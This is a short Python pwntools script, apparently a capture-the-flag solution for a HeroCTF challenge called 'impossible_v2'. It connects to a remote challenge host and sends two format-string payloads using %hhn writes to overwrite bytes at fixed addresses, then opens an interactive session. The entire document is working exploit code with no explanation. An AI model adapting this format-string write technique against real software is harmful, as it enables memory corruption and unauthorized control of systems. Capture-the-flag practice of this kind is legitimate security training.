from pwn import *

context.binary = exe = ELF('./impossible_v2')

io = remote('static-03.heroctf.fr', 5001)
#gdb.attach(io, api=True)

io.recvuntil(b'message: ')
payload = b'%183c%9$hhn-----' + p64(0x404048)
io.sendline(payload)

io.recvuntil(b'(y/n) ')
io.sendline(b'y')

io.recvuntil(b'chance): ')
payload = b'%20c%9$hhn------' + p64(0x404049)
io.sendline(payload)

io.interactive()